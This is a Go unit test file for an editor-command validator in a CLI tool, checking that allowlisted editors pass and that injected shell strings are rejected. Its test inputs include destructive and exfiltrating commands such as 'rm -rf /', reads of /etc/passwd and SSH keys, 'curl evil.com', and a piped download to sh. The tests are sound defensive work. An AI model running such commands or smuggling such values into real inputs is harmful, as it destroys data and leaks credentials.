package cmd

import (
	"os"
	"testing"
)

func TestValidateEditorCommand(t *testing.T) {
	// Set test mode to prevent actual editor validation during tests
	t.Setenv("DSM_TEST_MODE", "1")

	tests := []struct {
		name        string
		editor      string
		expectError bool
		errorMsg    string
	}{
		// Safe editors from allowlist
		{
			name:        "safe editor - nano",
			editor:      "nano",
			expectError: false,
		},
		{
			name:        "safe editor - code",
			editor:      "code",
			expectError: false,
		},
		{
			name:        "safe editor - vim",
			editor:      "vim",
			expectError: false,
		},
		{
			name:        "safe editor - notepad",
			editor:      "notepad",
			expectError: false,
		},
		{
			name:        "safe editor - macOS TextEdit",
			editor:      "open -a TextEdit",
			expectError: false,
		},

		// Empty or whitespace
		{
			name:        "empty editor",
			editor:      "",
			expectError: true,
			errorMsg:    "cannot be empty",
		},
		{
			name:        "whitespace only",
			editor:      "   ",
			expectError: true,
			errorMsg:    "cannot be empty",
		},

		// Dangerous characters
		{
			name:        "command injection with semicolon",
			editor:      "nano; rm -rf /",
			expectError: true,
			errorMsg:    "dangerous character: ';'",
		},
		{
			name:        "command injection with pipe",
			editor:      "code | cat /etc/passwd",
			expectError: true,
			errorMsg:    "dangerous character: '|'",
		},
		{
			name:        "command injection with ampersand",
			editor:      "nano && curl evil.com",
			expectError: true,
			errorMsg:    "dangerous character: '&'",
		},
		{
			name:        "command injection with backtick",
			editor:      "vim `whoami`",
			expectError: true,
			errorMsg:    "dangerous character: '`'",
		},
		{
			name:        "command injection with dollar expansion",
			editor:      "nano $HOME/.ssh/id_rsa",
			expectError: true,
			errorMsg:    "dangerous character: '$'",
		},

		// Note: Path traversal is now allowed for legitimate editor paths per PR review feedback
		{
			name:        "path traversal with .. (allowed for nano but not with args)",
			editor:      "nano",
			expectError: false, // nano is in the allowlist, path traversal itself isn't blocked
		},
		{
			name:        "file removal command",
			editor:      "rm -rf /tmp",
			expectError: true,
			errorMsg:    "dangerous pattern: \"rm \"",
		},
		{
			name:        "format command",
			editor:      "format c:",
			expectError: true,
			errorMsg:    "dangerous pattern: \"format \"",
		},
		{
			name:        "shell redirection",
			editor:      "nano > /tmp/output",
			expectError: true,
			errorMsg:    "dangerous character: '>'",
		},

		// Edge cases
		{
			name:        "complex but safe macOS command",
			editor:      "open -a Sublime Text",
			expectError: false,
		},
		{
			name:        "unsafe macOS command",
			editor:      "open -a \"rm -rf /\"",
			expectError: true,
			errorMsg:    "dangerous pattern: \"rm \"",
		},

		// Known safe editors (should pass - they are in the allowlist)
		{
			name:        "known safe editor - gedit",
			editor:      "gedit",
			expectError: false, // gedit is in the safeEditors map
		},
		{
			name:        "known safe editor - atom",
			editor:      "atom",
			expectError: false, // atom is in the safeEditors map
		},

		// Additional command injection tests to ensure security
		// Note: These test the first line of defense - dangerous character detection
		{
			name:        "command injection with semicolon and space",
			editor:      "nano; rm -rf /",
			expectError: true,
			errorMsg:    "dangerous character: ';'",
		},
		{
			name:        "command injection with multiple commands",
			editor:      "vim && cat /etc/passwd",
			expectError: true,
			errorMsg:    "dangerous character: '&'",
		},
		{
			name:        "command injection with backslash escape",
			editor:      "nano\\;curl evil.com",
			expectError: true,
			errorMsg:    "dangerous character: ';'", // Semicolon is detected after backslash interpretation
		},
		{
			name:        "command injection with variable substitution",
			editor:      "nano $HOME/.ssh/id_rsa",
			expectError: true,
			errorMsg:    "dangerous character: '$'",
		},
		{
			name:        "command injection with command substitution",
			editor:      "nano $(cat /etc/passwd)",
			expectError: true,
			errorMsg:    "dangerous character: '$'",
		},
		{
			name:        "command injection with pipe to shell",
			editor:      "vim | sh",
			expectError: true,
			errorMsg:    "dangerous character: '|'",
		},
		{
			name:        "command injection with redirect and append",
			editor:      "nano >> /etc/crontab",
			expectError: true,
			errorMsg:    "dangerous character: '>'",
		},
		{
			name:        "command injection with null bytes",
			editor:      "nano\x00rm -rf /",
			expectError: true,
			errorMsg:    "potentially dangerous pattern: \"rm \"", // Falls through to pattern detection
		},
		{
			name:        "command injection with tab character",
			editor:      "nano\tcat /etc/shadow",
			expectError: true,
			errorMsg:    "potentially dangerous pattern: \"sh\"", // Falls through to pattern detection
		},
		{
			name:        "command injection with newline",
			editor:      "nano\ncurl evil.com",
			expectError: true,
			errorMsg:    "potentially dangerous pattern: \"curl\"", // Falls through to pattern detection
		},
		{
			name:        "command injection with URL and pipe",
			editor:      "nano https://evil.com/script.sh | sh",
			expectError: true,
			errorMsg:    "dangerous character: '|'",
		},
		{
			name:        "command injection with base64 encoded payload",
			editor:      "nano `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",
			expectError: true,
			errorMsg:    "dangerous character: '|'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := validateEditorCommand(tt.editor)

			if tt.expectError {
				if err == nil {
					t.Errorf("validateEditorCommand(%q) expected error containing %q, got nil", tt.editor, tt.errorMsg)
				} else if !containsString(err.Error(), tt.errorMsg) {
					t.Errorf("validateEditorCommand(%q) error = %q, expected to contain %q", tt.editor, err.Error(), tt.errorMsg)
				}
			} else {
				if err != nil {
					t.Errorf("validateEditorCommand(%q) unexpected error: %v", tt.editor, err)
				}
				// In CI/test mode, validateEditorCommand returns "true" for all safe editors
				// to prevent actual editor execution. We need to handle both cases.
				expectedResult := tt.editor
				if os.Getenv("DSM_TEST_MODE") != "" || os.Getenv("CI") != "" {
					expectedResult = "true"
				}
				if result != expectedResult {
					t.Errorf("validateEditorCommand(%q) = %q, expected %q", tt.editor, result, expectedResult)
				}
			}
		})
	}
}

// Helper function to check if a string contains a substring
func containsString(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) &&
		(s[:len(substr)] == substr || s[len(s)-len(substr):] == substr ||
			indexOfSubstring(s, substr) >= 0))
}

func indexOfSubstring(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}
